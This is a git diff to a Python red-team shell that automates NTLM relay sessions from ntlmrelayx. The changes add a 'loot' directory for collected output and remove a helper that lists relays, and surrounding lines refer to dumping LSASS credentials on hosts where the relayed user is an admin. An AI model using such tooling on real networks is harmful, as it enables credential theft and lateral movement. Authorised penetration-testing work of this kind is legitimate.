@@ -134,7 +134,12 @@ class MiniShell(cmd.Cmd):
                 tmp = tmp.replace('"', '')
                 tmp = tmp.replace('\n', '')
                 tmp = tmp.split('],')
+                
                 # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
+
+                if os.path.isdir(cwd + "/loot") == False:
+                    os.makedirs(cwd + "/loot")
+
                 for item in tmp:
                     dat = item.replace(']', '').split(',')
                     if dat[3] == 'TRUE':
@@ -165,7 +170,7 @@ class MiniShell(cmd.Cmd):
                             except Exception as e:
                                 print(str(e))
                                 Print('Error Dumping lsass')
-                                
+
 
                             #step 3 start servers
                             if not self.serversRunning:
@@ -313,25 +318,6 @@ def config_check():
         print('{} ERROR you are missing "socks4  127.0.0.1 1080" in your proxychains configs'.format(red_minus))
         sys.exit(1)
 
-
-def run_the_table():
-    headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
-    url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
-    try:
-        proxy_handler = ProxyHandler({})
-        opener = build_opener(proxy_handler)
-        response = Request(url)
-        r = opener.open(response)
-        result = r.read()
-        print(result)
-        items = json.loads(result)
-    except Exception as e:
-        logging.error("ERROR: %s" % str(e))
-    else:
-        if len(items) > 0:
-            print()
-        else:
-            logging.info('No Relays Available!')
 
 # Process command-line arguments.
 if __name__ == '__main__':
